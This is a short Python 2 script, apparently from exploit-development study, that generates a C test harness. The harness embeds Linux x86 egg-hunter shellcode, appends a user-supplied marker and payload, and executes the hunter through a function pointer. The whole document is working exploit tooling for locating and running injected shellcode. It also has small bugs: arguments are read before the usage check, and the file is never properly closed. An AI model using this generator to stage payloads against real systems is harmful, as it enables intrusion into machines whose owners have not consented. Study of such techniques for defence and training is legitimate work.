#!/usr/bin/env python2
from sys import argv
egg = argv[1]
payload = argv[2]

if len(argv) != 3:
    print 'Usage: ./port.py "\\xDE\\xAD\\xDE\\xAD" "\\xPA\\xYL\\xOA\\xDG\\xOES\\xHE\\xRE"'
    print 'Note how the first argument is the egg and second the payload.'
    print 'Note how the egg must be a repetition of 2 bytes'
    quit()

print '\nEgg hunter builder'
print 'Egg: %s' % egg
print 'Payload: %s' % payload

code = '''
#include<stdio.h>
#include<string.h>

unsigned char hunter[] = \
"\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a"
"\\x21\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8'''

code += '%s"' % egg
code += '''
"\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7";
unsigned char egg[] = \

'''

code += '"%s"\n' % egg*2
code += '"%s";\n' % payload
code += '''
main()
{
        printf("Hunter Length:  %d\\n", strlen(hunter));
        printf("Egg Length:  %d\\nHunting the egg...\\n", strlen(egg));
        int (*ret)() = (int(*)())hunter;
        ret();
}
'''

print 'Writing code to shellcode-pygen.c'
f = open('shellcode-pygen.c', 'w')
f.write(code)
f.close
